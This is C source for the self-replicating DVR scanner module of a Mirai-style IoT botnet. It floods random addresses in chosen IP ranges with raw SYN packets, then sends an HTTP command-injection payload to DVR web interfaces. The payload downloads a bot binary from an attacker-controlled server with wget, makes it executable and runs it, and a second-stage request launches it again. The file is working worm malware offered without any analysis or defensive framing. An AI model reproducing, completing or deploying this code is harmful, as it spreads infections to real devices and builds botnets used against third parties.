#ifdef SELFREP

#define _GNU_SOURCE

#ifdef DEBUG
    #include <stdio.h>
#endif
#include <unistd.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <sys/types.h>
#include <time.h>
#include <fcntl.h>
#include <signal.h>
#include <errno.h>
#include <string.h>
#include <linux/ip.h>
#include <linux/tcp.h>

#include "includes.h"
#include "dvr.h"
#include "table.h"
#include "rand.h"
#include "util.h"
#include "checksum.h"

int dvr_scanner_pid = 0, dvr_rsck = 0, dvr_rsck_out = 0, dvr_auth_table_len = 0;
char dvr_scanner_rawpkt[sizeof(struct iphdr) + sizeof(struct tcphdr)] = {0};
struct dvr_scanner_auth *dvr_auth_table = NULL;
struct dvr_scanner_connection *conn_table;
uint16_t dvr_dvr_auth_table_max_weight = 0;
uint32_t dvr_fake_time = 0;
int dvr_ranges[] = {189,187,201,190,200,153,180,191,210,177,179,45,103,116,118};

/* DVR exploit payloads */
static char *dvr_payload_cmd = 
    "GET /cgi-bin/verify.cgi?cmd=verify&user=admin&pass=admin'$(cd /tmp;wget http://%s/bins/axis.$(uname -m);chmod +x axis.$(uname -m);./axis.$(uname -m) &)' HTTP/1.1\r\n"
    "Host: %d.%d.%d.%d\r\n"
    "Connection: close\r\n\r\n";

static char *dvr_login_cmd = 
    "POST /login.cgi HTTP/1.1\r\n"
    "Host: %d.%d.%d.%d\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 40\r\n"
    "\r\n"
    "username=admin&password=admin1234\r\n\r\n";

int dvr_recv_strip_null(int sock, void *buf, int len, int flags)
{
    int ret = recv(sock, buf, len, flags);

    if(ret > 0)
    {
        int i = 0;

        for(i = 0; i < ret; i++)
        {
            if(((char *)buf)[i] == 0x00)
            {
                ((char *)buf)[i] = 'A';
            }
        }
    }

    return ret;
}

void dvr_scanner_init(void)
{
    int i = 0;
    uint16_t source_port;
    struct iphdr *iph;
    struct tcphdr *tcph;

    // Let parent continue on main thread
    dvr_scanner_pid = fork();
    if(dvr_scanner_pid > 0 || dvr_scanner_pid == -1)
        return;

    LOCAL_ADDR = util_local_addr();

    rand_init();
    dvr_fake_time = time(NULL);
    conn_table = calloc(DVR_SCANNER_MAX_CONNS, sizeof(struct dvr_scanner_connection));
    for(i = 0; i < DVR_SCANNER_MAX_CONNS; i++)
    {
        conn_table[i].state = DVR_SC_CLOSED;
        conn_table[i].fd = -1;
        conn_table[i].credential_index = 0;
    }

    // Set up raw socket scanning and payload
    if((dvr_rsck = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
        #ifdef DEBUG
            printf("[dvr] failed to initialize raw socket, cannot scan\n");
        #endif
        exit(0);
    }
    fcntl(dvr_rsck, F_SETFL, O_NONBLOCK | fcntl(dvr_rsck, F_GETFL, 0));
    i = 1;
    if(setsockopt(dvr_rsck, IPPROTO_IP, IP_HDRINCL, &i, sizeof(i)) != 0)
    {
        #ifdef DEBUG
            printf("[dvr] failed to set IP_HDRINCL, cannot scan\n");
        #endif
        close(dvr_rsck);
        exit(0);
    }

    do
    {
        source_port = rand_next() & 0xFFFF;
    } while(ntohs(source_port) < 1024);

    // Build SYN packet for scanning
    iph = (struct iphdr *)dvr_scanner_rawpkt;
    tcph = (struct tcphdr *)(iph + 1);

    // IP header
    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    iph->id = rand_next();
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;
    iph->saddr = LOCAL_ADDR;

    // TCP header
    tcph->source = source_port;
    tcph->dest = htons(80); // HTTP port for DVR
    tcph->seq = rand_next();
    tcph->doff = 5;
    tcph->syn = TRUE;
    tcph->window = rand_next() & 0xFFFF;
    tcph->check = checksum((uint16_t *)dvr_scanner_rawpkt, sizeof(dvr_scanner_rawpkt));

    // Start scanner loop
    while(TRUE)
    {
        fd_set fdset;
        struct timeval timeo;
        int mfd = 0, nfds;

        FD_ZERO(&fdset);
        FD_SET(dvr_rsck, &fdset);
        mfd = dvr_rsck;

        for(i = 0; i < DVR_SCANNER_MAX_CONNS; i++)
        {
            if(conn_table[i].state != DVR_SC_CLOSED)
            {
                FD_SET(conn_table[i].fd, &fdset);
                if(conn_table[i].fd > mfd)
                    mfd = conn_table[i].fd;
            }
        }

        timeo.tv_sec = 0;
        timeo.tv_usec = 1000;

        nfds = select(mfd + 1, &fdset, NULL, NULL, &timeo);
        if(nfds == -1)
        {
            #ifdef DEBUG
                printf("[dvr] select failed\n");
            #endif
            break;
        }
        else if(nfds == 0)
        {
            // Timeout - send more SYN packets
            uint16_t pps = 0;
            struct iphdr *iph = (struct iphdr *)dvr_scanner_rawpkt;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);

            for(i = 0; i < DVR_SCANNER_RAW_PPS; i++)
            {
                iph->id = rand_next();
                iph->daddr = get_random_dvr_ip();
                iph->check = 0;
                iph->check = checksum((uint16_t *)iph, sizeof(struct iphdr));

                tcph->seq = rand_next();
                tcph->check = 0;
                tcph->check = checksum((uint16_t *)dvr_scanner_rawpkt, sizeof(dvr_scanner_rawpkt));

                paddr.sin_family = AF_INET;
                paddr.sin_addr.s_addr = iph->daddr;
                paddr.sin_port = tcph->dest;

                sendto(dvr_rsck, dvr_scanner_rawpkt, sizeof(dvr_scanner_rawpkt), MSG_NOSIGNAL, (struct sockaddr *)&paddr, sizeof(paddr));
            }

            // Process connection table
            for(i = 0; i < DVR_SCANNER_MAX_CONNS; i++)
            {
                struct dvr_scanner_connection *conn = &conn_table[i];

                if(conn->state == DVR_SC_CLOSED)
                {
                    // Find new connection slot
                    int n = -1;
                    for(n = i; n < DVR_SCANNER_MAX_CONNS; n++)
                    {
                        if(conn_table[n].state == DVR_SC_CLOSED)
                        {
                            // Use this slot
                            conn = &conn_table[n];
                            conn->dst_addr = get_random_dvr_ip();
                            conn->dst_port = 80;
                            break;
                        }
                    }

                    if(n == DVR_SCANNER_MAX_CONNS)
                        break;

                    dvr_setup_connection(conn);
                }
            }
        }
        else
        {
            // Process incoming data
            for(i = 0; i < DVR_SCANNER_MAX_CONNS; i++)
            {
                struct dvr_scanner_connection *conn = &conn_table[i];

                if(conn->state == DVR_SC_CLOSED)
                    continue;

                if((FD_ISSET(conn->fd, &fdset)))
                {
                    if(conn->state == DVR_SC_CONNECTING)
                    {
                        // Connection established - send exploit
                        int err = 0;
                        socklen_t err_len = sizeof(err);

                        getsockopt(conn->fd, SOL_SOCKET, SO_ERROR, &err, &err_len);
                        if(err != 0)
                        {
                            conn->state = DVR_SC_CLOSED;
                            continue;
                        }

                        // Send DVR exploit payload
                        char exploit_cmd[2048];
                        snprintf(exploit_cmd, sizeof(exploit_cmd), dvr_payload_cmd,
                            HTTP_SERVER_IP,
                            (conn->dst_addr >> 24) & 0xFF,
                            (conn->dst_addr >> 16) & 0xFF,
                            (conn->dst_addr >> 8) & 0xFF,
                            conn->dst_addr & 0xFF);

                        send(conn->fd, exploit_cmd, strlen(exploit_cmd), MSG_NOSIGNAL);
                        conn->state = DVR_SC_EXPLOIT_STAGE2;
                        conn->last_recv = dvr_fake_time;
                    }
                    else if(conn->state == DVR_SC_EXPLOIT_STAGE2)
                    {
                        // Check if exploit worked
                        if(strstr(conn->rdbuf, "200 OK") != NULL || strstr(conn->rdbuf, "HTTP/1") != NULL)
                        {
                            // Try secondary payload
                            char secondary_cmd[1024];
                            snprintf(secondary_cmd, sizeof(secondary_cmd),
                                "GET /cgi-bin/system.cgi?cmd=system'$(/tmp/axis.$(uname -m) &)' HTTP/1.1\r\n"
                                "Host: %d.%d.%d.%d\r\n\r\n",
                                (conn->dst_addr >> 24) & 0xFF,
                                (conn->dst_addr >> 16) & 0xFF,
                                (conn->dst_addr >> 8) & 0xFF,
                                conn->dst_addr & 0xFF);

                            send(conn->fd, secondary_cmd, strlen(secondary_cmd), MSG_NOSIGNAL);

                            #ifdef DEBUG
                                printf("[dvr] Successfully infected DVR %d.%d.%d.%d\n",
                                    (conn->dst_addr >> 24) & 0xFF,
                                    (conn->dst_addr >> 16) & 0xFF,
                                    (conn->dst_addr >> 8) & 0xFF,
                                    conn->dst_addr & 0xFF);
                            #endif

                            conn->state = DVR_SC_CLOSED;
                        }
                        else
                        {
                            conn->state = DVR_SC_CLOSED;
                        }
                    }
                }

                // Read response
                if(conn->state != DVR_SC_CLOSED && conn->state != DVR_SC_CONNECTING)
                {
                    int ret = dvr_recv_strip_null(conn->fd, conn->rdbuf + conn->rdbuf_pos, 
                        DVR_SCANNER_RDBUF_SIZE - conn->rdbuf_pos, MSG_NOSIGNAL);

                    if(ret <= 0)
                    {
                        conn->state = DVR_SC_CLOSED;
                        close(conn->fd);
                        conn->fd = -1;
                    }
                    else
                    {
                        conn->rdbuf_pos += ret;
                        conn->rdbuf[conn->rdbuf_pos] = 0;
                        conn->last_recv = dvr_fake_time;
                    }
                }

                // Check for timeout
                if(conn->state != DVR_SC_CLOSED && (dvr_fake_time - conn->last_recv) > 30)
                {
                    conn->state = DVR_SC_CLOSED;
                    close(conn->fd);
                    conn->fd = -1;
                }
            }
        }

        dvr_fake_time = time(NULL);
    }
}

void dvr_kill(void)
{
    kill(dvr_scanner_pid, 9);
}

static void dvr_setup_connection(struct dvr_scanner_connection *conn)
{
    struct sockaddr_in addr;
    int flags;

    conn->fd = socket(AF_INET, SOCK_STREAM, 0);
    if(conn->fd == -1)
    {
        conn->state = DVR_SC_CLOSED;
        return;
    }

    flags = fcntl(conn->fd, F_GETFL, 0);
    fcntl(conn->fd, F_SETFL, O_NONBLOCK | flags);

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = conn->dst_addr;
    addr.sin_port = htons(conn->dst_port);

    conn->state = DVR_SC_CONNECTING;
    conn->last_recv = dvr_fake_time;
    conn->rdbuf_pos = 0;
    memset(conn->rdbuf, 0, sizeof(conn->rdbuf));

    connect(conn->fd, (struct sockaddr *)&addr, sizeof(addr));
}

static ipv4_t get_random_dvr_ip(void)
{
    uint32_t o1, o2, o3, o4;
    int range_idx;

    do
    {
        range_idx = rand() % (sizeof(dvr_ranges)/sizeof(int));
        o1 = dvr_ranges[range_idx];

        o2 = rand_next() % 256;
        o3 = rand_next() % 256;
        o4 = rand_next() % 256;

    } while(o2 == 0 || o2 == 255 || o3 == 0 || o3 == 255);

    return INET_ADDR(o1,o2,o3,o4);
}

#endif
